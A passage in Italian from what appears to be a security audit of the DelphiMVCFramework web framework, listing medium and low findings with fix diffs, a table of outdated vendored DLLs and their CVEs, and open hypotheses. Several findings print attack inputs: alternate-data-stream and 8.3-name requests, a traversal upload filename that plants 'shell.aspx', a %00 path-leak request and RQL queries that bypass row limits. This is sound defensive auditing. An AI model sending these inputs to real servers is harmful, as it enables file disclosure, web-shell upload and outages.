per finestra. A 1000 rps su finestra da 60 s sono ~60k entry scansionate per richiesta, serializzate.

**La modalità di default `rlkIP` non è aggirabile** — `ExtractKey` → `Request.ClientIP` → `MVCResolveClientIP`
con `MVCTrustProxyForwardedHeaders = False` (vedi §6). Il problema è specifico delle chiavi controllate dal client.

```diff
     CleanupExpiredEntries;
+    // Tetto rigido, non una LRU: un client che ruota l'header non deve poter
+    // far crescere lo store senza limiti.
+    if FStorage.Count > MAX_RATELIMIT_KEYS then FStorage.Clear;
```

con `MAX_RATELIMIT_KEYS = 100000`, e documentare che `rlkAPIKey` è sicuro solo se la chiave viene **validata
prima** che il limiter giri.

Il backend Redis ha la debolezza speculare: `RateLimit.Redis.pas:109-116` e `:150-157` **fail open** su qualunque
errore Redis. Deliberato e commentato, ma merita un flag: buttare giù Redis oggi disattiva globalmente il rate
limiting invece di rifiutare.

---

### M-11 — MEDIUM — (A) Bypass di blocklist via normalizzazione dei nomi Windows nello static-files

**File:** `sources/MVCFramework.pas:4057`

`TPath.HasValidPathChars(lFileName, True)`: su Windows `FInvalidPathChars` è `#0..#31, " < > |` — **`:` non c'è**,
e il `True` *permette* esplicitamente `*` e `?`. Quindi `C:\www\web.config::$DATA` passa `HasValidPathChars`,
passa `GetFullPath`, **passa il containment check** (è davvero sotto la root), e `TFile.Exists` + `SendFile` lo
servono.

```http
GET /static/web.config::$DATA HTTP/1.1     (alternate data stream)
GET /static/secret.txt.       HTTP/1.1     (Win32 elimina il punto finale)
GET /static/SECRET~1.TXT      HTTP/1.1     (nome 8.3)
```

Non è traversal, ma sconfigge ogni regola di deny scritta sul callback `fRules` (`StaticFiles.pas:270-279`) o su
una blocklist di estensioni; e `ExtractFileExt` restituisce `.config::$DATA`, quindi il lookup del media type
manca e il file viene servito come `application/octet-stream`.

L'HTTPFilter `StaticFiles` (`Filters.pas:649`) **rifiuta già** `:`: è la guardia che le altre due implementazioni
non hanno.

```diff
--- a/sources/MVCFramework.pas   (dopo :4056)
   lFileName := TPath.Combine(lWebRoot, AWebRequestPath.Replace('/', TPath.DirectorySeparatorChar));
+  {$IFDEF MSWINDOWS}
+  // ':' non è un path char invalido, quindi un ADS ("f.txt::$DATA") passerebbe;
+  // punto/spazio finali e '*'/'?' vengono normalizzati o espansi da Win32.
+  if (Pos(':', AWebRequestPath) > 0) or AWebRequestPath.EndsWith('.') or
+     AWebRequestPath.EndsWith(' ') then
+    Exit(False);
+  {$ENDIF}
   if not TPath.HasValidPathChars(lFileName, True) then
```

---

### M-12 — MEDIUM — (A) HTTP.sys collassa `..`, Indy e WebBroker no

**File:** `sources/MVCFramework.HttpSys.Request.pas:281-293` (da `CookedUrl.pAbsPath`, già canonicalizzato dal
kernel) vs `sources/MVCFramework.Indy.Request.pas:577-580` (`FRequestInfo.URI`, verbatim).

`GET /public/../admin`: su HTTP.sys il kernel collassa e la route eseguita è `/admin`; su Indy/WebBroker la
stringa letterale arriva al router → nessun match statico → 404 (a meno che una route parametrica non la
inghiotta — vedi H-04). DMVC non normalizza **nulla**: `Router.pas` non ha alcuna gestione di `..`, `//` o punti
finali.

Un'ACL di proxy scritta come "deny `/admin`" è aggirata su HTTP.sys da `GET /public/../admin`.

**Fix consigliato:** normalizzare i dot-segment **nel router**, una volta, per tutti gli host, prima del match
(`Router.pas:455`). È la sola sede in cui la correzione vale per tutti e tre.

---

### M-13 — MEDIUM — (A) Header duplicati: HTTP.sys li unisce con virgola, Indy prende il primo

**File:** `sources/MVCFramework.HttpSys.Request.pas:388-396` (il kernel ha già unito i 41 header noti in un solo
slot) vs `sources/MVCFramework.Indy.Request.pas:266-269` (`RawHeaders.Values[]` → `IndexOfName` → primo).

`Authorization: Bearer good` + `Authorization: Bearer evil` sulla stessa richiesta: su HTTP.sys il middleware
riceve `"Bearer good, Bearer evil"`, su Indy `"Bearer good"`. Un JWT middleware che fa
`StartsWith('Bearer ')` e poi prende il resto della stringa si comporta diversamente sui due host. Gli header
**custom** duplicati (`X-Api-Key`, `X-Forwarded-For`) sono first-wins su Indy e HTTP.sys, ma uniti con virgola
sotto ISAPI.

**Fix consigliato:** rifiutare con 400 le richieste con `Authorization`, `Content-Type` o `Content-Length`
duplicati — è ciò che fanno i server moderni, ed elimina la classe intera invece di riconciliare tre
comportamenti.

---

### M-14 — MEDIUM — (A) Il router matcha case-insensitive su tutti gli host

**File:** `sources/MVCFramework.Router.pas:260` (`LKey := LowerCase(ARoute.FullPath)`), `:463` (lookup
lowercased), `:775` (`TRegEx.Create(FValue, [roIgnoreCase, ...])`).

`GET /ADMIN/Users` colpisce l'action `/admin/users` su ogni host. La maggior parte delle ACL di reverse proxy
(`location` di nginx, `<Location>` di Apache, rewrite di IIS) sono case-**sensitive**: è un bypass in una
richiesta di qualunque regola "deny `/admin`".

Almeno è **coerente fra host**, il che lo rende un problema di documentazione più che di divergenza. Ma va
detto esplicitamente nella guida al deployment: *le regole del proxy davanti a DMVC devono essere
case-insensitive.* In alternativa, aggiungere una property `CaseSensitiveRouting` (default `False` per
compatibilità) che permetta di allineare i due.

---

### M-15 — MEDIUM — (B) `TMVCFormFile.SaveToFile` non sanifica; l'helper sicuro è opt-in e la guida non lo cita

**File:** `sources/MVCFramework.MinimalAPI.pas:817-830`; `FileName` da
`sources/MVCFramework.Indy.Request.pas:833-838`, `:854`; helper a `MinimalAPI.pas:770-777`.

```pascal
procedure TMVCFormFile.SaveToFile(const APath: string);
begin
  lFile := TFileStream.Create(APath, fmCreate);
```

Nessuna normalizzazione, nessun confinamento. `FileName` è copiato verbatim fra `filename="` e la `"` successiva,
**senza alcuna sanificazione**.

`SafeFileName` (`:770-777`) esiste ed è corretto (normalizza `/`, `TPath.GetFileName`, rifiuta `.`/`..`), con un
test che lo copre (`unittests/general/TestClient/FrameworkTestsU.pas:340`). Il problema è che è opt-in e la
documentazione non lo nomina: `docs/minimal_api_guide.md:421` elenca l'API come "`FieldName`, `FileName`, …
`SaveToFile(path)`" e l'esempio del §4.5 stampa `Doc.FileName` direttamente; `SafeFileName` non compare **da
nessuna parte** in `docs/`.

**Scenario** — contro l'idioma della guida stessa (`Doc.SaveToFile(TPath.Combine(UPLOAD_DIR, Doc.FileName))`):

```
Content-Disposition: form-data; name="doc"; filename="..\..\..\inetpub\wwwroot\shell.aspx"
```

**Fix consigliato** — una riga, che elimina il footgun invece di documentarlo:

```diff
 procedure TMVCFormFile.SaveToFile(const APath: string);
 begin
+  { Chi passa una directory + il FileName grezzo del client non deve poterne
+    uscire. La parte directory è onorata, il leaf è sempre sanificato. }
+  APath := TPath.Combine(TPath.GetDirectoryName(APath), TPath.GetFileName(APath));
   lFile := TFileStream.Create(APath, fmCreate);
```

(serve `APath` come `var` o copia locale.) Più una frase in `docs/minimal_api_guide.md:421` che nomini
`SafeFileName`.

---

### M-16 — MEDIUM — (B) Il wizard disabilita `Secure` sul cookie JWT e lo scrive nel `.env` generato

**File:** `ideexpert/templates/engineconfig.pas.tpro:217`, `webmodule.pas.tpro:224`, `dotenv.tpro:98`.

```pascal
.SetCookieSecure(dotEnv.Env('JWT_COOKIE_SECURE', False))
```
```
JWT_COOKIE_SECURE=false
```

Il default del framework è corretto (`Middleware.JWT.pas:1036,1063`: `FCookieSecure := True`). Il wizard lo
scavalca. `webmodule.pas.tpro:223` porta almeno un commento di avvertimento; `engineconfig.pas.tpro` — il
percorso Indy Direct, cioè il **default** per i nuovi progetti — non ne ha nessuno.

Ogni web app generata dal wizard spedisce il cookie di autenticazione senza `Secure`, e chi promuove in
produzione senza toccare `.env` continua a spedirlo in chiaro.

**Fix:** invertire il default a `True` nel template e in `dotenv.tpro` (`JWT_COOKIE_SECURE=true`), con un
commento che dica di metterlo a `false` **solo** per lo sviluppo locale in HTTP.

---

### L-01 — LOW — (B) `SecurityHeaders` non imposta CSP, HSTS né `X-Frame-Options`; e il valore è malformato

**File:** `sources/MVCFramework.Middleware.SecurityHeaders.pas:73-74`; filtro a `sources/MVCFramework.Filters.pas:824-825`.

```pascal
AContext.Response.SetCustomHeader('X-XSS-Protection', '1; mode = block');   // :73
AContext.Response.SetCustomHeader('X-Content-Type-Options', 'nosniff');     // :74
```

1. `'1; mode = block'` con gli spazi attorno all'`=` **non è un valore valido**: i browser che ancora leggono
   l'header ignorano la direttiva. La versione filtro è corretta (`'1; mode=block'`). (Per inciso
   `X-XSS-Protection` è deprecato e ignorato dai browser moderni: l'header che conta è quello che manca.)
2. Niente `Content-Security-Policy`, niente `Strict-Transport-Security`, niente `X-Frame-Options`, niente
   `Referrer-Policy`. Per un'app browser-facing, CSP è l'unico che ferma davvero un XSS. Un dev che aggiunge
   "il middleware di security headers" ragionevolmente crede di essere coperto.

**Fix:** correggere il valore, e aggiungere parametri opzionali al costruttore per CSP / HSTS / frame-options con
default vuoti (nessun cambio di comportamento per chi aggiorna). Nota per la doc: il `baselayout.html` del wizard
carica Bootstrap e htmx da CDN, quindi una CSP `script-src 'self'` stretta li blocca — o self-host o allargare
deliberatamente.

---

### L-02 — LOW — (A) `%00` nel path statico produce un 500 che rivela il document root assoluto

**File:** `sources/MVCFramework.Middleware.StaticFiles.pas:291`

`TIdURI.URLDecode` (`IdURI.pas:370`) emette un `#0` reale in `PathInfo`. L'overload a 2 argomenti di
`TPath.Combine` ha `ValidateParams = True` e `DoCombine` solleva `EInOutArgumentException` su `#0` — a `:291`,
**prima** che `IsStaticFile` venga mai chiamata. Il gestore globale (`MVCFramework.pas:3235-3236`) risponde con
`Format('[%s] %s', [Ex.Classname, Ex.Message])`, e `SInvalidCharsInPath` è *"Invalid characters in path \"%s\""*
— cioè il **path server-side completo** nel body del 500.

```http
GET /static/a%00b HTTP/1.1
-> 500  [EInOutArgumentException] Invalid characters in path "C:\inetpub\myapp\www\a b"
```

```diff
--- a/sources/MVCFramework.Middleware.StaticFiles.pas   (prima di :291)
+  if not TPath.HasValidPathChars(lPathInfo, False) then
+  begin
+    AContext.Response.StatusCode := HTTP_STATUS.NotFound;
+    AHandled := True;
+    Exit;
+  end;
   lFullPathInfo := TPath.Combine(fDocumentRoot, lPathInfo);
```

Il fix di M-04 riduce comunque l'impatto.

---

### L-03 — LOW — (A) RQL: `limit(0,-1)` aggira `MaxEntitiesRecordCount` su SQLite

**File:** `sources/MVCFramework.RQL.Parser.pas:786-793`

`lRQLLimit.Count := Min(StrToInt64(lCount), MaxRecordCount);` — `Min` limita solo verso l'alto. `limit(0,-1)` dà
`Count = -1`, e `AST2SQLite.pas:184` emette `LIMIT -1 OFFSET 0`. **In SQLite un LIMIT negativo significa nessun
limite**: l'intera tabella viene serializzata, aggirando il default di 20 righe
(`ActiveRecordController.pas:331`, `MVCFramework.pas:2570`). Gli altri dialetti falliscono chiusi (PG/MSSQL
rifiutano un LIMIT negativo, Firebird `ROWS 1 to 0` non torna nulla, MySQL è errore di sintassi) — ma SQLite è il
default dei sample e dello scaffold.

Difetto gemello: `StrToInt64` senza guardia, e `MatchFieldNumericValue` accetta un `.` e cifre illimitate, quindi
`limit(1.5,10)` e `limit(0,99999999999999999999)` sollevano `EConvertError` → 500. Banale da innescare.

```diff
--- a/sources/MVCFramework.RQL.Parser.pas   (:786-793; System.Math già in uses a :31)
-  lRQLLimit.Start := StrToInt64(lStart);
+  lRQLLimit.Start := Max(0, StrToInt64Def(lStart, 0));
   if MaxRecordCount > -1 then
-    lRQLLimit.Count := Min(StrToInt64(lCount), MaxRecordCount)
+    lRQLLimit.Count := Min(Max(0, StrToInt64Def(lCount, 0)), MaxRecordCount)
   else
-    lRQLLimit.Count := StrToInt64(lCount);
+    lRQLLimit.Count := Max(0, StrToInt64Def(lCount, 0));
```

---

### L-04 — LOW — (A) `TMVCCORSMiddleware` non emette mai `Vary: Origin`

**File:** `sources/MVCFramework.Middleware.CORS.pas:144-159`

`FillCommonHeaders` scrive `Access-Control-Allow-Origin` con un valore che **dipende** dall'header `Origin`
(`GetAllowedOriginURL`, `:161-180`), ma non imposta mai `Vary: Origin`. Una cache condivisa davanti al server può
memorizzare la risposta con `ACAO: https://a.example` e riproporla a una richiesta da `https://b.example`. La
versione filtro lo fa già correttamente (`Filters.pas:1076-1078`).

```diff
--- a/sources/MVCFramework.Middleware.CORS.pas   (dopo :149)
   lCustomHeaders.Values['Access-Control-Allow-Origin'] := AAllowOrigin;
+  if AAllowOrigin <> '*' then
+    lCustomHeaders.Values['Vary'] := 'Origin';
```

---

### L-05 — LOW — (B) `TMVCCORSMiddleware`: default `*` **più** `Allow-Credentials: true`

**File:** `sources/MVCFramework.Middleware.CORS.pas:41-42`, `:153-158`; stessi default in
`sources/MVCFramework.Filters.pas:100-106`.

`ALLOWS_ORIGIN_URL = '*'` e `ALLOWS_CREDENTIALS = True`, emessi insieme. È una **violazione di spec, non un
exploit**: i browser rifiutano `ACAO: *` su una richiesta credenziata, quindi fallisce chiuso. Resta un foot-gun
(CORS credenziato silenziosamente rotto) e un'incoerenza con `CORSFilter`, il cui default è
`AAllowsCredentials = False` (`Filters.pas:207-214`) e che rifiuta esplicitamente di accoppiare i due. Allineare
il middleware classico, o almeno `LogW` alla costruzione quando entrambi sono impostati.

---

### L-06 — LOW — (A) `RangeMedia`: il prefix match non ha confine di segmento

**File:** `sources/MVCFramework.Middleware.RangeMedia.pas:375`, `sources/MVCFramework.Filters.pas:1899`

`LPathInfo.StartsWith(FURLPath, True)`: con `FURLPath = '/media'`, `/mediation/report` fa match, `AHandled := True`
viene impostato incondizionatamente (`:388`, il filtro non chiama mai `ANext`), e una route di controller
legittima resta permanentemente oscurata da un 404. Integrità di routing / disponibilità.

```diff
-  if not LPathInfo.StartsWith(FURLPath, True) then Exit;
+  if (LPathInfo <> FURLPath) and (not LPathInfo.StartsWith(FURLPath + '/', True)) then Exit;
```

---

### L-07 — LOW — (A) `($id)` matcha la stringa vuota

**File:** `sources/MVCFramework.Router.pas:556-560`

I path delle route sono compilati sostituendo `($name)` con `([...]*)` — nota `*`, non `+`. Quindi
`/api/users//profile` matcha `/api/users/($id)/profile` con `$id = ''`. Una regola di proxy indicizzata su un
segmento id non vuoto non matcha quell'URL; l'app la instrada e passa un parametro vuoto a codice che si aspetta
un valore. Fix: `+` invece di `*`, se non ci sono route che dipendono da un parametro opzionale vuoto.

---

### L-08 — LOW — (A) Un query param duplicato dà 500 solo su WebBroker

**File:** `sources/MVCFramework.WebBroker.Request.pas:461-463`

`?a=1&a=2` sotto ISAPI/Apache colpisce `FQueryParams.Add` con una chiave duplicata → `EListError` → 500.
Indy/HTTP.sys rispondono 200. DoS non autenticato in una richiesta su qualunque endpoint il cui codice tocchi
`QueryParams`, e solo su quell'host. Da risolvere insieme a M-03 (first-wins con `ContainsKey`).

---

### L-09 — LOW — (A) RQL: `in(field,[])` produce `IN ()` → 500

**File:** `sources/MVCFramework.RQL.Parser.pas:687-700`, `sources/MVCFramework.RQL.AST2SQLite.pas:146` e pari.
Un array vuoto genera `(field IN ())`, errore di sintassi del driver → 500 innescabile con `?rql=in(id,[])`.
One-liner: emettere `1=0` per un array vuoto.

---

### L-10 — LOW — (A) `MergeDefaultRQLFilter` classifica la clausola per substring

**File:** `sources/MVCFramework.ActiveRecord.pas:6257`

```pascal
if lRQLFilterPart.Contains('sort') or lRQLFilterPart.Contains('limit') then
```

Qualunque filtro il cui **testo** contenga `sort` o `limit` — un valore (`eq(city,"limitless")`), un nome colonna
(`assortment`) — viene classificato come clausola sort/limit; il filtro di default/partizione viene poi emesso da
solo e il parser rifiuta il risultato (`RQL.Parser.pas:850`) → 500. **Fallisce chiuso** (verificato: il filtro di
tenant non viene mai perso), quindi è disponibilità, non bypass. Il fix giusto è classificare dall'AST; non ne
vale la pena sotto una riscrittura.

---

### L-11 — LOW — (C) Lo scaffold del wizard insegna il binding del body direttamente sull'entity

Vedi H-11 per la meccanica. La parte specifica dello scaffold: `ideexpert/templates/controller_people.pas.tpro:33,37`
con `ideexpert/templates/entity.pas.tpro:20` che espone `property ID` scrivibile e senza `[MVCDoNotDeserialize]`.
Le action generate sono stub che fanno solo `LogI`, quindi il codice generato **non è di per sé vulnerabile** —
ma è il modello che il dev estende. Fix incluso in H-11.

---

### L-12 — LOW — (B) Token JWT accettato dal query string `access_token`

**File:** `sources/MVCFramework.Middleware.JWT.pas:663`, `:715`; costante a `:67-79`.

Il middleware accetta il token, oltre che dall'header `Authorization`, dal query param `access_token` — di
default, senza opt-in. Un token nel query string finisce nei log di accesso, nei log del reverse proxy, nel
`Referer` verso terze parti e nella cronologia del browser. Ha usi legittimi (SSE, `<img>`, download da tag HTML
che non possono impostare header): il fix corretto non è rimuoverlo ma renderlo opt-in per rotta, o almeno una
property del middleware con default `False`.

---

### L-13 — LOW — (B) Header `Server` e `X-Powered-By` esposti di default

**File:** `sources/MVCFramework.pas:2568-2569`, `:2749-2752`. `ExposeServerSignature` e `ExposeXPoweredBy` sono
entrambi `'true'` di default. Divulgazione di versione/tecnologia. Banale, ma è un default che ogni hardening
guide chiede di invertire e costa una riga.

---

### L-14 — LOW — (B) `[MVCSerialize(stFields)]` espone i campi privati in lettura **e scrittura**

**File:** `sources/MVCFramework.Serializer.JsonDataObjects.pas:2501`, `:2806`; `sources/MVCFramework.pas:36-37`.

Il default `stDefault` è trattato come `stProperties` ovunque (`:2459`, `:2771`, `:2856`, `:2980`) e la
visibilità di default delle property della RTL è `[vcPublic, vcPublished]`: **privati e protetti non sono esposti
di default** (vedi §6). Ma la visibilità di default dei *campi* è `[vcPrivate..vcPublished]`, che
`MVCFramework.pas:36-37` riafferma verbatim; e i rami `stFields` camminano `LRttiType.GetFields` **senza alcun
filtro di visibilità**. Dato che le entity AR mettono `[MVCTableField]` su campi **privati**,
`[MVCSerialize(stFields)]` su un'entity AR è una primitiva di scrittura sull'oggetto intero. Avvertenza da
documentazione, non cambio di codice.

---

## 4. Dipendenze

### Librerie vendorizzate

| Componente | Versione | Come determinata | CVE note | Azione |
|---|---|---|---|---|
| **LoggerPro** `lib/loggerpro` | **2.1.1** (2026-06-04) | `VERSION.TXT` + `LOGGERPRO_VERSION` in `loggerprobuildconsts.inc` | Nessuna. È l'ultima upstream. | Nessuna. |
| **SwagDoc** `lib/swagdoc` | **UNDETERMINATA** come numero — snapshot ≈ upstream **2024-09-12** | Nessuna costante di versione esiste (`c_SwaggerVersion='2.0'` in `Swag.Common.Consts.pas:32` è la versione della *spec*). Upstream non pubblica tag. Datata da mtime + `git log lib/swagdoc` | Nessuna CVE, nessun advisory. | Rischio basso: emette JSON, non parsa input non fidato. Risync opzionale. |
| **dmustache** `lib/dmustache` (subset mORMot 2) | **2.2.7423** | `lib/dmustache/mormot.commit.inc`; import 2024-04-29 (`d7433337`) | Nessuna CVE assegnata a mORMot. Upstream master è **2.4.16585** — due release stabili e ~2 anni indietro. | **Risync.** `mormot.core.json/.text/.buffers` sono parser; mancano 2 anni di fix di fuzzing/bounds. Caricato solo se si usa il view engine Mustache. |
| **JsonDataObjects** `sources/JsonDataObjects.pas` | upstream `13a256cb` (2025-12-14) + 1 cherry-pick locale ≈ master @ **2026-01-23** | `git log` sul file: `ae6974c7` nomina il commit upstream; `30e8aee8` (2026-01-23) applica il fix di arrotondamento sub-ms | **Nessuna.** Verificato esplicitamente: **nessun** fix upstream di crash/overflow/ricorsione del parser è assente dalla copia vendorizzata. | Nessuna azione di sicurezza. **Ma vedi C-01: il bug di ricorsione è presente anche upstream** — va segnalato ad ahausladen. |
| **Indy** | **NON VENDORIZZATA** | `git ls-files \| grep -E "/Id[A-Z].*\.pas$"` → vuoto | Dipende dall'installazione Delphi dell'utente — non determinabile da questo repo, ed è corretto così. | Fuori scope repo. |
| **TaurusTLS** | **NON VENDORIZZATA** | Solo `sources/MVCFramework.Server.HTTPS.TaurusTLS.pas`, un wiring da ~150 righe | UNDETERMINATA. | Fuori scope. |

### Binari committati — OpenSSL

| DLL | Versione | Come determinata | CVE in range | Azione |
|---|---|---|---|---|
| `unittests/general/TestClient/bin32\|bin64/libeay32.dll`, `ssleay32.dll` | **OpenSSL 1.0.2u** (20/12/2019) | `VersionInfo.FileVersion = 1.0.2u`, confermato dal banner ASCII estratto dai byte: `"OpenSSL 1.0.2u  20 Dec 2019"` | Branch **EOL 31/12/2019**, nessuna release pubblica da allora. Confermate come affette: **CVE-2026-63072** (Moderate, heap overflow in CMS key unwrap), CVE-2026-54874, CVE-2026-42766, CVE-2026-34180, CVE-2026-7383, CVE-2026-9076, CVE-2026-28388 — tutte con fix **solo premium**. Storicamente anche CVE-2022-0778 (loop infinito su parsing certificato) e CVE-2023-0286 (High, X.400 type confusion). | **Priorità massima fra le dipendenze.** Vedi nota sotto. |
| `unittests/general/TestClient/bin32\|bin64/libcrypto-3*.dll`, `libssl-3*.dll` | **OpenSSL 3.6.1** (27/01/2026) | VersionInfo + banner | **CVE-2026-45447 — High**, heap use-after-free in `PKCS7_verify()`, fixata in 3.6.3. Più ~9 Moderate e ~20 Low fixate in 3.6.2–3.6.4. | Portare a **3.6.4**. |
| `unittests/general/TestClient/pgsql/bin/libcrypto-3-x64.dll`, `libssl-3-x64.dll` | **OpenSSL 3.0.20** (07/04/2026) | VersionInfo + banner | **CVE-2026-45447 — High** (fix in 3.0.21); Moderate CVE-2026-34182, CVE-2026-45445 (3.0.21), CVE-2026-63072 (3.0.22). | Portare a **3.0.22**. |
| `samples/activerecord_showcase/bin32\|bin64/libcrypto-1_1*.dll`, `libssl-1_1*.dll` | **OpenSSL 1.1.1s** (01/11/2022) | VersionInfo + banner; committata `5c3c0565`, 2024-09-13 | Branch **EOL 2023-09-11**; solo 1.1.1t/u/v/w sono pubbliche. In range: **CVE-2023-0286 (High)**, CVE-2023-0215, CVE-2022-4450, CVE-2022-4304, CVE-2023-2650, CVE-2023-3446, CVE-2023-3817, CVE-2023-4807, CVE-2023-0464/0465/0466, poi le premium-only fra cui **CVE-2026-45447 (High)** e CVE-2025-9230. ~33 in totale. | **Eliminare o sostituire con 3.x.** Non esiste un percorso di patch pubblico su questo branch. |

**Nota sull'1.0.2u — perché conta.** Le due DLL sono state aggiunte **deliberatamente e di recente**: commit
`4d7de17f`, 2026-05-17, *"vendor embedded PostgreSQL 17.10 + Firebird 3.0.14 + OpenSSL 1.0.2u runtimes"*.
`libeay32.dll` / `ssleay32.dll` sono esattamente i nomi che il loader legacy di Indy risolve per nome dalla
directory dell'applicazione, e DMVC chiama quel loader direttamente da:

- `sources/MVCFramework.Crypt.Utils.pas:145` — `if not LoadOpenSSLLibrary then raise ...` (unit PBKDF2 →
  **password hashing**), **incondizionato**
- `sources/MVCFramework.RESTClient.Indy.pas:42`, `:1555` — `TIdSSLIOHandlerSocketOpenSSL`, TLS client
- `sources/MVCFramework.WebSocket.Client.pas:38`, `:234` — idem
- `sources/MVCFramework.Server.HTTPS.TaurusTLS.pas:76`

**Correzione a un'analisi preliminare:** `MVCFramework.HMAC.pas:74/128` (l'`Assert(LoadOpenSSLLibrary)`) sta
dentro il ramo `{$ELSE}` di `USEBUILTINHMAC`, definito per `CompilerVersion >= 30.0`. La baseline supportata è
10.2 Tokyo (32.0), quindi **quel ramo è codice morto su tutte le versioni Delphi supportate: il JWT HMAC NON usa
OpenSSL.** Gli altri quattro punti sopra restano invece vivi. Una libreria crittografica EOL da 6 anni e mezzo non
è inerte qui: è quella caricata per TLS client e PBKDF2 nella suite di test e in qualunque app la cui bin
directory sia stata copiata dal repo. Le `libcrypto-3`/`libssl-3` più recenti nella *stessa* directory non la
oscurano — `IdSSLOpenSSL` non guarda quei nomi.

### Binari committati — database e altro

| DLL | Versione | CVE in range | Azione |
|---|---|---|---|
| `samples/activerecord_showcase/bin32\|bin64/libpq.dll` | **PostgreSQL 10.23** | PG 10 **EOL 2022-11-10**, 10.23 è l'ultima release in assoluto. **CVE-2026-6477 (CVSS 8.8)** — libpq `lo_*`/`PQfn()` scrive dati controllati dal server di lunghezza arbitraria in un buffer di stack fisso; fixata in 14.23/15.18/16.14/17.10/18.4, **mai per la 10**. **CVE-2025-12818 (5.9)** — integer wraparound → OOB write. CVE-2022-41862. | **Sostituire o eliminare.** Trascina anche l'OpenSSL 1.1.1s. |
| `unittests/general/TestClient/pgsql/bin/libpq.dll` | **PostgreSQL 17.10** | Nessuna. 17.10 è la release che *fixa* CVE-2026-6477. | Nessuna. |
| `unittests/.../firebird/fbclient.dll` | **Firebird 3.0.14.33856** | 3.0.14 è il fix per CVE-2026-40342 e altri. Resta **CVE-2025-65104 (7.9)** — client FB3 contro server FB4+ → information leak; upstream dichiara che **non esiste un fix FB3**. | Rischio pratico basso (la fixture accoppia client FB3 e server FB3). Passare al client FB4+ se la fixture punterà a FB4+. |
| `unittests/.../mariadb/bin/libcurl.dll` | **libcurl 8.16.0-DEV** | **32 CVE** fixate in 8.17.0–8.20.0, fra cui CVE-2026-8925 (SASL double-free) e CVE-2026-3805 (SMB UAF). | Solo fixture di test; aggiornare col bundle MariaDB. |
| `unittests/.../pgsql/bin/libcurl.dll` | **8.20.0** | Nessuna. | Nessuna. |
| `unittests/.../pgsql/bin/libxml2.dll` | **2.15.3** | Nessuna. 2.15.3 è il fix per CVE-2026-0989/0990/0992/1757. | Nessuna. |
| `zlib1.dll` (1.3.2 / 1.3.1), `libmariadb.dll` 3.4.9, `server.dll` MariaDB 12.2.2, `libzstd` 1.5.7, `liblz4` 1.10.0 | come indicato | Nessuna in range. | Nessuna. |
| `samples/renders/Win32/Debug/lua5.1.dll`, `samples/routing/Win32/Debug/lua5.1.dll` | **Lua 5.1.4** | **CVE-2014-5461** — buffer overflow nelle funzioni vararg di `ldo.c`, "Lua 5.1 through 5.2.x before 5.2.3". Lua 5.1 non è supportata dal 2012. | **Eliminare.** Sono output di build `Win32/Debug` obsoleti; nessun `.pas` nel repo referenzia Lua. |
| Firebird `icu*52.dll` (2013), `msvcr100/msvcp100.dll` (VC++ 2010, EOL); pgsql `icu*67.dll` (2020) | UNDETERMINATE per file | Non ricercate (fuori dalla superficie nominata). Tutti runtime EOL da anni. | Solo nota; arrivano coi bundle DB upstream. |

**Metodo di verifica per OpenSSL:** per ciascuna DLL rappresentativa sono stati letti i byte del file,
decodificati in ASCII, e cercato `OpenSSL \d+\.\d+\.\d+[a-z]?( \d{1,2} \w{3} \d{4})?`. Il banner interno
concorda con `VersionInfo.FileVersion` in ogni caso, date di build comprese: le versioni sono confermate da due
fonti indipendenti, non solo dai metadati di risorsa.

**Igiene adiacente, fuori dalla superficie nominata:** `lib/loggerpro/`, `lib/swagdoc/Source/`, `lib/dmustache/`
e `sources/` hanno `.dcu` committati accanto ai `.pas` (es. `Swag.Common.Types.dcu`, 101 KB, buildato
2026-08-27). Binari precompilati in un albero di dipendenze non sono verificabili contro i sorgenti e vincono
silenziosamente su un `.pas` nel search path. Inoltre `lib/loggerpro/__history` e `lib/dmustache/__history` sono
directory di backup dell'IDE tracciate in git.

---

## 5. Findings NON CONFERMATI / da approfondire

| # | Ipotesi | Cosa manca |
|---|---|---|
| N-01 | H-05 (CRLF) **sul filo di HTTP.sys** | Il percorso di codice è non sanificato (`HttpSys.Response.pas:311-321`, `:294-298`) e il valore va a `HttpSendHttpResponse` come `PAnsiChar` contato. Se l'HTTP Server API del kernel rifiuti CR/LF dentro `pRawValue` di un header sconosciuto non è documentato da Microsoft e non è stato eseguito. **Fixare comunque.** |
| N-02 | H-05 / M-08 sotto ISAPI e Apache | `TWebResponse.AddCustomHeaders` costruisce il blocco header grezzo, ma `ServerSupportFunction` di IIS e il modulo Apache potrebbero filtrare a valle. Il fix nel builder rende la questione irrilevante. |
| N-03 | SSRF via redirect di `TMVCRESTClient` | Default: `HandleRedirects := True`, `MaxRedirects := 5` (`RESTClient.pas:974-975`) — **un limite di hop c'è**. DMVC non aggancia mai `THTTPClient.OnRedirect`, quindi la RTL segue `Location` ovunque punti, incluso `https:`→`http:` e RFC1918 / `169.254.169.254`. Che la RTL non filtri schema né indirizzo è visibile nel loop di redirect, ma non è stato eseguito. **Da testare per primo, insieme a H-06.** `IsReservedOrPrivateIP` esiste già in `Commons.pas`: è il gancio giusto. |
| N-04 | Nomi device Windows nello static-files (`GET /static/CON`, `/static/COM1`) | Il nome passa il containment check, ma non è determinabile staticamente se `TFile.Exists('C:\www\CON')` ritorni `True` e se `TFileStream.Create` blocchi il worker. Sonda manuale sull'host Indy. |
| N-05 | HTTP.sys e gli slash ripetuti | Se il `CookedUrl.pAbsPath` del kernel collassi `////`. Se non lo fa, il vettore UNC di C-03 è vivo anche su HTTP.sys. Il fix di C-03 copre entrambi i casi. |
| N-06 | Se HTTP.sys rifiuti `%2F` con 400 invece di decodificarlo | Governato dai valori di registro `AllowRestrictedChars` / `PercentUAllowed` sotto `HTTP\Parameters`; nulla nel repo li fissa. La colonna HTTP.sys di H-04 è "decodificato-o-400", entrambi diversi da Indy: la divergenza regge comunque, ma il codice esatto va testato dal vivo. |
| N-07 | `TWebRequest.URL` sotto ISAPI in particolare | Il ragionamento su Apache è confermato dal commento a `WebBroker.Request.pas:432-440`; non è stato letto `Web.Win.ISAPIApp.pas` per confermare che IIS non restituisca un URL già canonicalizzato. Se IIS canonicalizza, WebBroker/ISAPI si comporta come HTTP.sys per H-04/M-12, non come Indy. |
| N-08 | C-01: se uccida **ogni** worker su Indy Direct | Misurato in un processo console standalone: il segfault è a livello di processo, quindi dovrebbe portarsi via tutti i thread di connessione Indy. Non è stato messo in piedi un `TIdHTTPServer` vivo. I numeri Win64 rendono la distinzione accademica. |
| N-09 | Profondità di stack overflow sotto IIS/ISAPI e Apache | Girano nel thread dell'host con lo stack dell'host, non misurato. Stack più piccolo ⇒ soglia più bassa: il finding non si indebolisce. |
